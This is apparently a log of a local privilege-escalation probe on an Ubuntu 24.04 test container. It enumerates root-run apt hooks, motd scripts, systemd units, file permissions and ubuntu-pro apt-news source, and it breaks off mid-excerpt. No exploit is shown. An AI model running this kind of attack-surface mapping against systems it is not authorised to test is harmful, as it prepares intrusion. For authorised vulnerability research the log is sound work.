Ubuntu Pro apt-news/apt hook probe
target=ubuntu24-server-lpe-target attacker=attacker selfauth=selfauth
2026-05-16T13:21:04-0400

$ docker exec ubuntu24-server-lpe-target bash -lc $'\nset +e\necho "== cleanup before probe =="\nrm -rf /tmp/ubuntu_pro_apt_news_probe* /tmp/ubuntu_pro_apt_news_* \\\n  /home/attacker/ubuntu_pro_apt_news_probe \\\n  /home/selfauth/ubuntu_pro_apt_news_probe 2>/dev/null || true\nrm -f /root/ubuntu_pro_apt_news_lpe_proof /root/ubuntu_pro_apt_news_* 2>/dev/null || true\nsystemctl reset-failed apt-news.service esm-cache.service apt-daily.service \\\n  apt-daily-upgrade.service motd-news.service update-notifier-motd.service \\\n  2>/dev/null || true\n'
== cleanup before probe ==

$ docker exec ubuntu24-server-lpe-target bash -lc $'\nset -euo pipefail\necho "== target identity and default package proof =="\ncat /etc/os-release\nuname -a\nps -p 1 -o user=,comm=,args=\nid attacker\nid selfauth\necho\ndpkg-query -W ubuntu-pro-client ubuntu-pro-client-l10n ubuntu-advantage-tools \\\n  apt update-notifier-common base-files libpam-modules login openssh-server \\\n  systemd unattended-upgrades 2>/dev/null || true\necho\necho "== apt/pro/motd config files =="\nfor f in /etc/apt/apt.conf.d/20apt-esm-hook.conf \\\n  /etc/apt/apt.conf.d/10periodic /etc/apt/apt.conf.d/15update-stamp \\\n  /etc/apt/apt.conf.d/20auto-upgrades /etc/apt/apt.conf.d/99update-notifier \\\n  /etc/default/motd-news /etc/update-motd.d/50-motd-news \\\n  /etc/update-motd.d/91-contract-ua-esm-status; do\n  echo "### $f"\n  if [ -e "$f" ]; then\n    stat -Lc "%A %a %U:%G %n" "$f"\n    nl -ba "$f" | sed -n "1,180p"\n  else\n    echo "MISSING $f"\n  fi\ndone\necho\necho "== systemd units and timers =="\nsystemctl cat apt-news.service esm-cache.service apt-daily.service \\\n  apt-daily-upgrade.service motd-news.service update-notifier-motd.service \\\n  2>/dev/null || true\nfor u in apt-news.service esm-cache.service apt-daily.service apt-daily.timer \\\n  apt-daily-upgrade.service apt-daily-upgrade.timer motd-news.service \\\n  motd-news.timer update-notifier-motd.service update-notifier-motd.timer; do\n  echo "### $u"\n  systemctl show -p LoadState -p UnitFileState -p ActiveState -p SubState \\\n    -p Result -p ConditionResult -p FragmentPath -p User -p Environment \\\n    -p PassEnvironment -p ExecStart "$u" 2>&1 || true\ndone\necho\necho "== pam/login reachability =="\nfor f in /usr/bin/login /bin/login /usr/bin/su /usr/sbin/runuser /usr/bin/runuser; do\n  [ -e "$f" ] && stat -Lc "%A %a %U:%G %n" "$f" || echo "MISSING $f"\ndone\ngrep -RIn "pam_motd" /etc/pam.d || true\n'
== target identity and default package proof ==
PRETTY_NAME="Ubuntu 24.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.4 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo
Linux 4f5b414436ae 6.10.14-linuxkit #1 SMP Sat May 17 08:28:57 UTC 2025 aarch64 aarch64 aarch64 GNU/Linux
root     systemd         /sbin/init
uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
uid=1002(selfauth) gid=1002(selfauth) groups=1002(selfauth)

apt	2.8.3
base-files	13ubuntu10.4
libpam-modules:arm64	1.5.3-5ubuntu5.5
login	1:4.13+dfsg1-4ubuntu3.2
openssh-server	
systemd	255.4-1ubuntu8.15
ubuntu-advantage-tools	
ubuntu-pro-client	37.2ubuntu~24.04
ubuntu-pro-client-l10n	37.2ubuntu~24.04
unattended-upgrades	2.9.1+nmu4ubuntu1
update-notifier-common	3.192.68.2

== apt/pro/motd config files ==
### /etc/apt/apt.conf.d/20apt-esm-hook.conf
-rw-r--r-- 644 root:root /etc/apt/apt.conf.d/20apt-esm-hook.conf
     1	APT::Update::Pre-Invoke {
     2		"[ ! -e /run/systemd/system ] || [ $(id -u) -ne 0 ] || systemctl start --no-block apt-news.service esm-cache.service >/dev/null 2>&1 || true";
     3	};
     4	
     5	binary::apt::AptCli::Hooks::Upgrade {
     6		"[ ! -f /usr/lib/ubuntu-advantage/apt-esm-json-hook ] || [ $(id -u) -ne 0 ] || /usr/lib/ubuntu-advantage/apt-esm-json-hook 2>> /var/log/ubuntu-advantage-apt-hook.log || true";
     7	};
### /etc/apt/apt.conf.d/10periodic
-rw-r--r-- 644 root:root /etc/apt/apt.conf.d/10periodic
     1	APT::Periodic::Update-Package-Lists "1";
     2	APT::Periodic::Download-Upgradeable-Packages "0";
     3	APT::Periodic::AutocleanInterval "0";
### /etc/apt/apt.conf.d/15update-stamp
-rw-r--r-- 644 root:root /etc/apt/apt.conf.d/15update-stamp
     1	APT::Update::Post-Invoke-Success {"touch /var/lib/apt/periodic/update-success-stamp 2>/dev/null || true";};
### /etc/apt/apt.conf.d/20auto-upgrades
-rw-r--r-- 644 root:root /etc/apt/apt.conf.d/20auto-upgrades
     1	APT::Periodic::Update-Package-Lists "1";
     2	APT::Periodic::Unattended-Upgrade "1";
### /etc/apt/apt.conf.d/99update-notifier
-rw-r--r-- 644 root:root /etc/apt/apt.conf.d/99update-notifier
     1	DPkg::Post-Invoke {"if [ -d /var/lib/update-notifier ]; then touch /var/lib/update-notifier/dpkg-run-stamp; fi; /usr/lib/update-notifier/update-motd-updates-available 2>/dev/null || true";};
     2	APT::Update::Post-Invoke-Success {"/usr/lib/update-notifier/update-motd-updates-available 2>/dev/null || true";};
### /etc/default/motd-news
-rw-r--r-- 644 root:root /etc/default/motd-news
     1	# Enable/disable the dynamic MOTD news service
     2	# This is a useful way to provide dynamic, informative
     3	# information pertinent to the users and administrators
     4	# of the local system
     5	ENABLED=1
     6	
     7	# Configure the source of dynamic MOTD news
     8	# White space separated list of 0 to many news services
     9	# For security reasons, these must be https
    10	# and have a valid certificate
    11	# Canonical runs a service at motd.ubuntu.com, and you
    12	# can easily run one too
    13	URLS="https://motd.ubuntu.com"
    14	
    15	# Specify the time in seconds, you're willing to wait for
    16	# dynamic MOTD news
    17	# Note that news messages are fetched in the background by
    18	# a systemd timer, so this should never block boot or login
    19	WAIT=5
### /etc/update-motd.d/50-motd-news
-rwxr-xr-x 755 root:root /etc/update-motd.d/50-motd-news
     1	#!/bin/sh
     2	#
     3	#    50-motd-news - print the live news from the Ubuntu wire
     4	#    Copyright (C) 2016-2020 Canonical Ltd.
     5	#    Copyright (C) 2016-2017 Dustin Kirkland
     6	#
     7	#    Authors: Dustin Kirkland <kirkland@canonical.com>
     8	#             Steve Langasek <steve.langasek@canonical.com>
     9	#
    10	#    This program is free software; you can redistribute it and/or modify
    11	#    it under the terms of the GNU General Public License as published by
    12	#    the Free Software Foundation; either version 2 of the License, or
    13	#    (at your option) any later version.
    14	#
    15	#    This program is distributed in the hope that it will be useful,
    16	#    but WITHOUT ANY WARRANTY; without even the implied warranty of
    17	#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    18	#    GNU General Public License for more details.
    19	#
    20	#    You should have received a copy of the GNU General Public License along
    21	#    with this program; if not, write to the Free Software Foundation, Inc.,
    22	#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
    23	
    24	##############################################################################
    25	# This program could be rewritten in C or Golang for faster performance.
    26	# Or it could be rewritten in Python or another higher level language
    27	# for more modularity.
    28	# However, I've insisted on shell here for transparency!
    29	#                                                                     - Dustin
    30	##############################################################################
    31	
    32	# Source the local configuration
    33	[ -r /etc/default/motd-news ] && . /etc/default/motd-news
    34	
    35	# Exit immediately, unless we're enabled
    36	# This makes this script very easy to disable in /etc/default/motd-news configuration
    37	[ "$ENABLED" = "1" ] || exit 0
    38	
    39	# Ensure sane defaults
    40	[ -n "$URLS" ] || URLS="https://motd.ubuntu.com"
    41	[ -n "$WAIT" ] || WAIT=5
    42	[ -n "$CACHE" ] || CACHE="/var/cache/motd-news"
    43	[ "$1" = "--force" ] && FORCED=1
    44	
    45	# Ensure we print safely, maximum of the first 10 lines,
    46	# maximum of the first 80 chars per line, no control chars
    47	safe_print() {
    48		cat "$1" | head -n 10 | tr -d '\000-\011\013\014\016-\037' | cut -c -80
    49	}
    50	
    51	
    52	# If we're not forcing an update, and we have a cached motd-news file,
    53	# then just print it and exit as quickly as possible, for login performance.
    54	# Note that systemd should keep this cache file up to date, asynchronously
    55	if [ "$FORCED" != "1" ]; then
    56	  	if [ -r $CACHE ]; then
    57			echo
    58			safe_print $CACHE
    59		elif [ "$(id -u)" -eq 0 ]; then
    60			: > $CACHE
    61		fi
    62		exit 0
    63	fi
    64	
    65	# If we've made it here, we've been given the --force argument,
    66	# probably from the systemd motd-news.service.  Let's update...
    67	
    68	# Abort early if wget is missing
    69	[ -x /usr/bin/wget ] || exit 0
    70	
    71	# Generate our temp files, clean up when done
    72	NEWS=$(mktemp) || exit 1
    73	ERR=$(mktemp) || exit 1
    74	CLOUD=$(mktemp) || exit 1
    75	trap "rm -f $NEWS $ERR $CLOUD" HUP INT QUIT ILL TRAP KILL BUS TERM
    76	
    77	# Construct a user agent, similar to Firefox/Chrome/Safari/IE to
    78	# ensure a proper, tailored, accurate message of the day
    79	
    80	# wget browser version, for debug purposes
    81	wget_ver="$(dpkg -l wget | awk '$1 == "ii" { print($3); exit(0); }')"
    82	
    83	# Distribution version, for messages releated to this Ubuntu release
    84	. /etc/lsb-release
    85	lsb=$(echo "$DISTRIB_DESCRIPTION" | sed -e "s/ /\//g")
    86	codename="$DISTRIB_CODENAME"
    87	
    88	# Kernel version and CPU type, for messages related to a particular revision or hardware
    89	platform="$(uname -o)/$(uname -r)/$(uname -m)"
    90	arch="$(uname -m)"
    91	cpu="$(grep -m1 "^model name" /proc/cpuinfo | sed -e "s/.*: //" -e "s:\s\+:/:g")"
    92	cloud_id="unknown"
    93	if [ -x /usr/bin/cloud-id ]; then
    94	    /usr/bin/cloud-id > "$CLOUD" 2>/dev/null
    95	    if [ "$?" -eq "0" ]; then
    96	        # sanitize it a bit, just in case
    97	        cloud_id=$(cut -c -40 "${CLOUD}" | tr -c -d '[:alnum:]')
    98	        if [ -z "${cloud_id}" ]; then
    99	            cloud_id="unknown"
   100	        fi
   101	    fi
   102	fi
   103	
   104	# Piece together the user agent
   105	USER_AGENT="wget/$wget_ver $lsb $platform $cpu cloud_id/$cloud_id"
   106	
   107	# Loop over any configured URLs
   108	for u in $URLS; do
   109		# Ensure https:// protocol, for security reasons
   110		case $u in
   111			https://*)
   112				true
   113			;;
   114			https://motd.ubuntu.com)
   115				u="$u/$codename/$arch"
   116			;;
   117			*)
   118				continue
   119			;;
   120		esac
   121		# If we're forced, set the wait to much higher (1 minute)
   122		[ "$FORCED" = "1" ] && WAIT=60
   123		# Fetch and print the news motd
   124		result=0
   125		not_found_is_ok=0
   126		wget --timeout "$WAIT" -U "$USER_AGENT" -O- --content-on-error "$u" >"$NEWS" 2>"$ERR" || result=$?
   127		# from wget's manpage: 8   Server issued an error response.
   128		if [ $result -eq 8 ]; then
   129			if grep -q "ERROR 404" "$ERR"; then
   130				# The server's 404 document is the generic, non cloud-specific, motd-news
   131				# content present in the index.txt file
   132				not_found_is_ok=1
   133			fi
   134		fi
   135		if [ $result -eq 0 ] || [ $not_found_is_ok -eq 1 ]; then
   136			echo
   137			# At most, 10 lines of text, remove control characters, print at most 80 characters per line
   138			safe_print "$NEWS"
   139			# Try to update the cache
   140			safe_print "$NEWS" 2>/dev/null >$CACHE || true
   141		else
   142			: > "$CACHE"
   143	 	fi
   144	done
   145	rm -f "$NEWS" "$ERR" "$CLOUD"
   146	exit 0
### /etc/update-motd.d/91-contract-ua-esm-status
-rwxr-xr-x 755 root:root /etc/update-motd.d/91-contract-ua-esm-status
     1	#!/bin/sh
     2	contract_status_stamp="/var/lib/ubuntu-advantage/messages/motd-contract-status"
     3	
     4	[ ! -r "$contract_status_stamp" ] || cat "$contract_status_stamp"
     5	
     6	auto_attach_stamp="/var/lib/ubuntu-advantage/messages/motd-auto-attach-status"
     7	
     8	[ ! -r "$auto_attach_stamp" ] || cat "$auto_attach_stamp"

== systemd units and timers ==
# /usr/lib/systemd/system/apt-news.service
# APT News is hosted at https://motd.ubuntu.com/aptnews.json and can include
# timely information related to apt updates available to your system.
# This service runs in the background during an `apt update` to download the
# latest news and set it to appear in the output of the next `apt upgrade`.
# The script won't do anything if you've run: `pro config set apt_news=false`.
# The script will limit network requests to at most once per 24 hours.
# You can also host your own aptnews.json and configure your system to use it
# with the command:
# `pro config set apt_news_url=https://yourhostname/path/to/aptnews.json`

[Unit]
Description=Update APT News

[Service]
Type=oneshot
ExecStart=/usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py
AppArmorProfile=-ubuntu_pro_apt_news
CapabilityBoundingSet=~CAP_SYS_ADMIN
CapabilityBoundingSet=~CAP_NET_ADMIN
CapabilityBoundingSet=~CAP_NET_BIND_SERVICE
CapabilityBoundingSet=~CAP_SYS_PTRACE
CapabilityBoundingSet=~CAP_NET_RAW
PrivateTmp=true
RestrictAddressFamilies=~AF_NETLINK
RestrictAddressFamilies=~AF_PACKET
# These may break some tests, and should be enabled carefully
#NoNewPrivileges=true
#PrivateDevices=true
#ProtectControlGroups=true
# ProtectHome=true seems to reliably break the GH integration test with a lunar lxd on jammy host
#ProtectHome=true
#ProtectKernelModules=true
#ProtectKernelTunables=true
#ProtectSystem=full
#RestrictSUIDSGID=true
# Unsupported in bionic
# Suggestion from systemd.exec(5) manpage on SystemCallFilter
#SystemCallFilter=@system-service
#SystemCallFilter=~@mount
#SystemCallErrorNumber=EPERM
#ProtectClock=true
#ProtectKernelLogs=true

# /usr/lib/systemd/system/esm-cache.service
# The ESM apt cache will maintain information about what ESM updates are
# available to a system. This information will be presented to users in the apt
# output, or when running pro security-status. These caches are maintained
# entirely outside the system apt configuration to avoid interference with user
# definitions. This service updates those caches. This will only have effect
# on releases where ESM is applicable, starting from Xenial: esm-apps for
# every LTS, and esm-infra for systems in expanded support period after the LTS
# expires.

[Unit]
Description=Update the local ESM caches

[Service]
Type=oneshot
ExecStart=/usr/bin/python3 /usr/lib/ubuntu-advantage/esm_cache.py
AppArmorProfile=-ubuntu_pro_esm_cache
CapabilityBoundingSet=~CAP_SYS_ADMIN
CapabilityBoundingSet=~CAP_NET_ADMIN
CapabilityBoundingSet=~CAP_NET_BIND_SERVICE
CapabilityBoundingSet=~CAP_SYS_PTRACE
CapabilityBoundingSet=~CAP_NET_RAW
PrivateTmp=true
RestrictAddressFamilies=~AF_NETLINK
RestrictAddressFamilies=~AF_PACKET


# /usr/lib/systemd/system/apt-daily.service
[Unit]
Description=Daily apt download activities
Documentation=man:apt(8)
ConditionACPower=true
After=network.target network-online.target systemd-networkd.service NetworkManager.service connman.service

[Service]
Type=oneshot
ExecStartPre=-/usr/lib/apt/apt-helper wait-online
ExecStart=/usr/lib/apt/apt.systemd.daily update


# /usr/lib/systemd/system/apt-daily-upgrade.service
[Unit]
Description=Daily apt upgrade and clean activities
Documentation=man:apt(8)
ConditionACPower=true
After=apt-daily.service network.target network-online.target systemd-networkd.service NetworkManager.service connman.service

[Service]
Type=oneshot
ExecStartPre=-/usr/lib/apt/apt-helper wait-online
ExecStart=/usr/lib/apt/apt.systemd.daily install
KillMode=process
TimeoutStopSec=900

# /usr/lib/systemd/system/motd-news.service
[Unit]
Description=Message of the Day
After=network-online.target
Documentation=man:update-motd(8)

[Service]
Type=oneshot
ExecStart=/etc/update-motd.d/50-motd-news --force

# /usr/lib/systemd/system/update-notifier-motd.service
[Unit]
Description=Check to see whether there is a new version of Ubuntu available
ConditionFileIsExecutable=/usr/lib/ubuntu-release-upgrader/release-upgrade-motd

[Service]
ExecStart=/usr/lib/ubuntu-release-upgrader/release-upgrade-motd
Type=oneshot
### apt-news.service
Result=success
ExecStart={ path=/usr/bin/python3 ; argv[]=/usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py ; ignore_errors=no ; start_time=[n/a] ; stop_time=[n/a] ; pid=0 ; code=(null) ; status=0/0 }
Environment=
PassEnvironment=
User=
LoadState=loaded
ActiveState=inactive
SubState=dead
FragmentPath=/usr/lib/systemd/system/apt-news.service
UnitFileState=static
ConditionResult=no
### esm-cache.service
Result=success
ExecStart={ path=/usr/bin/python3 ; argv[]=/usr/bin/python3 /usr/lib/ubuntu-advantage/esm_cache.py ; ignore_errors=no ; start_time=[n/a] ; stop_time=[n/a] ; pid=0 ; code=(null) ; status=0/0 }
Environment=
PassEnvironment=
User=
LoadState=loaded
ActiveState=inactive
SubState=dead
FragmentPath=/usr/lib/systemd/system/esm-cache.service
UnitFileState=static
ConditionResult=no
### apt-daily.service
Result=success
ExecStart={ path=/usr/lib/apt/apt.systemd.daily ; argv[]=/usr/lib/apt/apt.systemd.daily update ; ignore_errors=no ; start_time=[n/a] ; stop_time=[n/a] ; pid=0 ; code=(null) ; status=0/0 }
Environment=
PassEnvironment=
User=
LoadState=loaded
ActiveState=inactive
SubState=dead
FragmentPath=/usr/lib/systemd/system/apt-daily.service
UnitFileState=static
ConditionResult=no
### apt-daily.timer
Result=success
LoadState=loaded
ActiveState=active
SubState=waiting
FragmentPath=/usr/lib/systemd/system/apt-daily.timer
UnitFileState=enabled
ConditionResult=yes
### apt-daily-upgrade.service
Result=success
ExecStart={ path=/usr/lib/apt/apt.systemd.daily ; argv[]=/usr/lib/apt/apt.systemd.daily install ; ignore_errors=no ; start_time=[n/a] ; stop_time=[n/a] ; pid=0 ; code=(null) ; status=0/0 }
Environment=
PassEnvironment=
User=
LoadState=loaded
ActiveState=inactive
SubState=dead
FragmentPath=/usr/lib/systemd/system/apt-daily-upgrade.service
UnitFileState=static
ConditionResult=no
### apt-daily-upgrade.timer
Result=success
LoadState=loaded
ActiveState=active
SubState=waiting
FragmentPath=/usr/lib/systemd/system/apt-daily-upgrade.timer
UnitFileState=enabled
ConditionResult=yes
### motd-news.service
Result=success
ExecStart={ path=/etc/update-motd.d/50-motd-news ; argv[]=/etc/update-motd.d/50-motd-news --force ; ignore_errors=no ; start_time=[n/a] ; stop_time=[n/a] ; pid=0 ; code=(null) ; status=0/0 }
Environment=
PassEnvironment=
User=
LoadState=loaded
ActiveState=inactive
SubState=dead
FragmentPath=/usr/lib/systemd/system/motd-news.service
UnitFileState=static
ConditionResult=yes
### motd-news.timer
Result=success
LoadState=loaded
ActiveState=active
SubState=waiting
FragmentPath=/usr/lib/systemd/system/motd-news.timer
UnitFileState=enabled
ConditionResult=yes
### update-notifier-motd.service
Result=success
ExecStart={ path=/usr/lib/ubuntu-release-upgrader/release-upgrade-motd ; argv[]=/usr/lib/ubuntu-release-upgrader/release-upgrade-motd ; ignore_errors=no ; start_time=[n/a] ; stop_time=[n/a] ; pid=0 ; code=(null) ; status=0/0 }
Environment=
PassEnvironment=
User=
LoadState=loaded
ActiveState=inactive
SubState=dead
FragmentPath=/usr/lib/systemd/system/update-notifier-motd.service
UnitFileState=static
ConditionResult=no
### update-notifier-motd.timer
Result=success
LoadState=loaded
ActiveState=active
SubState=waiting
FragmentPath=/usr/lib/systemd/system/update-notifier-motd.timer
UnitFileState=enabled
ConditionResult=yes

== pam/login reachability ==
-rwxr-xr-x 755 root:root /usr/bin/login
-rwxr-xr-x 755 root:root /bin/login
-rwsr-xr-x 4755 root:root /usr/bin/su
-rwxr-xr-x 755 root:root /usr/sbin/runuser
MISSING /usr/bin/runuser
/etc/pam.d/login:33:session    optional   pam_motd.so motd=/run/motd.dynamic
/etc/pam.d/login:34:session    optional   pam_motd.so noupdate

$ docker exec ubuntu24-server-lpe-target bash -lc $'\nset -euo pipefail\necho "== root-owned state and cache path modes =="\nfor p in /etc/apt/apt.conf.d /etc/apt/apt.conf.d/20apt-esm-hook.conf \\\n  /etc/ubuntu-advantage /etc/ubuntu-advantage/uaclient.conf \\\n  /var/lib/ubuntu-advantage /var/lib/ubuntu-advantage/user-config.json \\\n  /var/lib/ubuntu-advantage/status.json /var/lib/ubuntu-advantage/messages \\\n  /var/lib/ubuntu-advantage/messages/apt-news \\\n  /var/lib/ubuntu-advantage/messages/apt-news-raw \\\n  /var/lib/ubuntu-advantage/apt-esm \\\n  /run/ubuntu-advantage /run/ubuntu-advantage/apt-news \\\n  /run/ubuntu-advantage/apt-news/aptnews.json \\\n  /var/cache/motd-news /var/lib/apt/periodic \\\n  /var/lib/apt/periodic/update-success-stamp \\\n  /var/lib/apt/lists /var/lib/apt/lists/partial \\\n  /usr/local/bin /usr/local/sbin; do\n  if [ -e "$p" ] || [ -L "$p" ]; then\n    stat -Lc "%A %a %U:%G %F %n -> %N" "$p"\n  else\n    echo "MISSING $p"\n  fi\ndone\necho\necho "== ubuntu-pro apt-news implementation excerpts =="\necho "### /usr/lib/ubuntu-advantage/apt_news.py"\nnl -ba /usr/lib/ubuntu-advantage/apt_news.py | sed -n "1,80p"\necho "### uaclient apt_news fetch/write"\nnl -ba /usr/lib/python3/dist-packages/uaclient/apt_news.py | sed -n "81,140p;160,224p;265,288p"\necho "### apt_news config and paths"\nnl -ba /usr/lib/python3/dist-packages/uaclient/config.py | sed -n "283,304p"\nnl -ba /usr/lib/python3/dist-packages/uaclient/files/user_config_file.py | sed -n "103,158p"\nnl -ba /usr/lib/python3/dist-packages/uaclient/files/state_files.py | sed -n "136,140p"\nnl -ba /usr/lib/python3/dist-packages/uaclient/defaults.py | sed -n "39,58p;80,88p"\necho "### atomic write/delete helpers"\nnl -ba /usr/lib/python3/dist-packages/uaclient/system.py | sed -n "600,646p"\necho "### apt stamp and ESM cache helpers"\nnl -ba /usr/lib/python3/dist-packages/uaclient/apt.py | sed -n "318,328p;884,940p"\necho "### apt-esm-json-hook"\nfile /usr/lib/ubuntu-advantage/apt-esm-json-hook\n/usr/lib/ubuntu-advantage/apt-esm-json-hook >/tmp/ubuntu_pro_apt_news_hook_root.out \\\n  2>/tmp/ubuntu_pro_apt_news_hook_root.err || true\nprintf "root hook stdout: "; sed -n "1,5p" /tmp/ubuntu_pro_apt_news_hook_root.out\nprintf "root hook stderr: "; sed -n "1,5p" /tmp/ubuntu_pro_apt_news_hook_root.err\nrm -f /tmp/ubuntu_pro_apt_news_hook_root.out /tmp/ubuntu_pro_apt_news_hook_root.err\n'
== root-owned state and cache path modes ==
drwxr-xr-x 755 root:root directory /etc/apt/apt.conf.d -> '/etc/apt/apt.conf.d'
-rw-r--r-- 644 root:root regular file /etc/apt/apt.conf.d/20apt-esm-hook.conf -> '/etc/apt/apt.conf.d/20apt-esm-hook.conf'
drwxr-xr-x 755 root:root directory /etc/ubuntu-advantage -> '/etc/ubuntu-advantage'
-rw-r--r-- 644 root:root regular file /etc/ubuntu-advantage/uaclient.conf -> '/etc/ubuntu-advantage/uaclient.conf'
drwxr-xr-x 755 root:root directory /var/lib/ubuntu-advantage -> '/var/lib/ubuntu-advantage'
MISSING /var/lib/ubuntu-advantage/user-config.json
-rw-r--r-- 644 root:root regular file /var/lib/ubuntu-advantage/status.json -> '/var/lib/ubuntu-advantage/status.json'
MISSING /var/lib/ubuntu-advantage/messages
MISSING /var/lib/ubuntu-advantage/messages/apt-news
MISSING /var/lib/ubuntu-advantage/messages/apt-news-raw
drwxr-xr-x 755 root:root directory /var/lib/ubuntu-advantage/apt-esm -> '/var/lib/ubuntu-advantage/apt-esm'
drwxr-xr-x 755 root:root directory /run/ubuntu-advantage -> '/run/ubuntu-advantage'
drwxr-xr-x 755 _apt:root directory /run/ubuntu-advantage/apt-news -> '/run/ubuntu-advantage/apt-news'
-rw-r--r-- 644 root:root regular file /run/ubuntu-advantage/apt-news/aptnews.json -> '/run/ubuntu-advantage/apt-news/aptnews.json'
-rw-r--r-- 644 root:root regular file /var/cache/motd-news -> '/var/cache/motd-news'
drwxr-xr-x 755 root:root directory /var/lib/apt/periodic -> '/var/lib/apt/periodic'
-rw-r--r-- 644 root:root regular empty file /var/lib/apt/periodic/update-success-stamp -> '/var/lib/apt/periodic/update-success-stamp'
drwxr-xr-x 755 root:root directory /var/lib/apt/lists -> '/var/lib/apt/lists'
drwx------ 700 _apt:root directory /var/lib/apt/lists/partial -> '/var/lib/apt/lists/partial'
drwxr-xr-x 755 root:root directory /usr/local/bin -> '/usr/local/bin'
drwxr-xr-x 755 root:root directory /usr/local/sbin -> '/usr/local/sbin'

== ubuntu-pro apt-news implementation excerpts ==
### /usr/lib/ubuntu-advantage/apt_news.py
     1	#!/usr/bin/python3
     2	
     3	from datetime import datetime, timedelta, timezone
     4	
     5	from uaclient import apt, log
     6	from uaclient.apt_news import update_apt_news
     7	from uaclient.config import UAConfig
     8	
     9	
    10	def main(cfg: UAConfig):
    11	    if not cfg.apt_news:
    12	        return
    13	
    14	    last_update = apt.get_apt_cache_datetime()
    15	    one_day_ago = datetime.now(timezone.utc) - timedelta(days=1)
    16	    if last_update is not None and last_update > one_day_ago:
    17	        return
    18	
    19	    update_apt_news(cfg)
    20	
    21	
    22	if __name__ == "__main__":
    23	    log.setup_journald_logging()
    24	    cfg = UAConfig()
    25	    main(cfg)
### uaclient apt_news fetch/write
    81	def _does_package_selector_apply(package_selector):
    82	    try:
    83	        package_name, version_operator, package_version = package_selector
    84	    except ValueError:
    85	        LOG.warning("Invalid package selector: %r", package_selector)
    86	        return False
    87	    installed_package_version = get_pkg_version(package_name)
    88	    if installed_package_version is None:
    89	        return False
    90	    version_comparison = version_compare(
    91	        installed_package_version, package_version
    92	    )
    93	    return any(
    94	        [
    95	            (
    96	                version_comparison == 0
    97	                and version_operator in ["==", "<=", ">="]
    98	            ),
    99	            (version_comparison < 0 and version_operator in ["<", "<="]),
   100	            (version_comparison > 0 and version_operator in [">", ">="]),
   101	        ]
   102	    )
   103	
   104	
   105	def do_selectors_apply(
   106	    cfg: UAConfig, selectors: Optional[AptNewsMessageSelectors]
   107	) -> bool:
   108	    if selectors is None:
   109	        return True
   110	
   111	    if selectors.codenames is not None:
   112	        if system.get_release_info().series not in selectors.codenames:
   113	            return False
   114	
   115	    if selectors.clouds is not None:
   116	        cloud_id, fail = get_cloud_type()
   117	        if fail is not None:
   118	            return False
   119	        if cloud_id not in selectors.clouds:
   120	            return False
   121	
   122	    if selectors.pro is not None:
   123	        if selectors.pro != _is_attached(cfg).is_attached:
   124	            return False
   125	
   126	    if selectors.architectures is not None:
   127	        if system.get_dpkg_arch() not in selectors.architectures:
   128	            return False
   129	
   130	    if selectors.packages is not None:
   131	        if not any(
   132	            [
   133	                _does_package_selector_apply(package_selector)
   134	                for package_selector in selectors.packages
   135	            ]
   136	        ):
   137	            return False
   138	
   139	    return True
   140	
   160	def is_control_char(c: str) -> bool:
   161	    return unicodedata.category(c)[0] == "C"
   162	
   163	
   164	def is_message_valid(msg: AptNewsMessage) -> bool:
   165	    if len(msg.lines) < 1:
   166	        return False
   167	    if len(msg.lines) > 3:
   168	        return False
   169	
   170	    for line in msg.lines:
   171	        if any([is_control_char(c) for c in line]):
   172	            return False
   173	        if len(line) > 77:
   174	            return False
   175	
   176	    return True
   177	
   178	
   179	def select_message(
   180	    cfg: UAConfig, messages: List[dict]
   181	) -> Optional[AptNewsMessage]:
   182	    for msg_dict in messages:
   183	        try:
   184	            msg = AptNewsMessage.from_dict(msg_dict)
   185	        except Exception as e:
   186	            LOG.debug("msg failed parsing: %r", e)
   187	            continue
   188	        if not is_message_valid(msg):
   189	            LOG.debug("msg not valid: %r", msg)
   190	            continue
   191	        if not do_dates_apply(msg.begin, msg.end):
   192	            LOG.debug("msg dates don't apply: %r", msg)
   193	            continue
   194	        if not do_selectors_apply(cfg, msg.selectors):
   195	            LOG.debug("msg selectors don't apply: %r", msg)
   196	            continue
   197	        return msg
   198	    return None
   199	
   200	
   201	@ensure_apt_pkg_init
   202	def fetch_aptnews_json(cfg: UAConfig):
   203	    os.makedirs(defaults.APT_NEWS_PATH, exist_ok=True)
   204	    shutil.chown(defaults.APT_NEWS_PATH, user="_apt")
   205	
   206	    acq = apt_pkg.Acquire()
   207	    apt_news_file = apt_pkg.AcquireFile(
   208	        acq, cfg.apt_news_url, hash="", destdir=defaults.APT_NEWS_PATH
   209	    )
   210	    acq.run()
   211	    apt_news_contents = system.load_file(apt_news_file.destfile)
   212	    return json.loads(
   213	        apt_news_contents,
   214	        cls=util.DatetimeAwareJSONDecoder,
   215	    )
   216	
   217	
   218	def fetch_and_process_apt_news(cfg: UAConfig) -> Optional[str]:
   219	    news_dict = fetch_aptnews_json(cfg)
   220	    msg = select_message(cfg, news_dict.get("messages", []))
   221	    LOG.debug("using msg: %r", msg)
   222	    if msg is not None:
   223	        return "\n".join(msg.lines)
   224	    return None
   265	def format_news_for_apt_update(news: str) -> str:
   266	    result = "#\n"
   267	    for line in news.split("\n"):
   268	        result += "# {}\n".format(line)
   269	    result += "#\n"
   270	    return result
   271	
   272	
   273	def update_apt_news(cfg: UAConfig):
   274	    try:
   275	        news = local_apt_news(cfg)
   276	        if not news:
   277	            news = fetch_and_process_apt_news(cfg)
   278	        if news:
   279	            state_files.apt_news_raw_file.write(news)
   280	            apt_update_formatted_news = format_news_for_apt_update(news)
   281	            state_files.apt_news_contents_file.write(apt_update_formatted_news)
   282	        else:
   283	            state_files.apt_news_contents_file.delete()
   284	            state_files.apt_news_raw_file.delete()
   285	    except Exception as e:
   286	        LOG.debug("something went wrong while processing apt_news: %r", e)
   287	        state_files.apt_news_contents_file.delete()
   288	        state_files.apt_news_raw_file.delete()
### apt_news config and paths
   283	    def apt_news(self) -> bool:
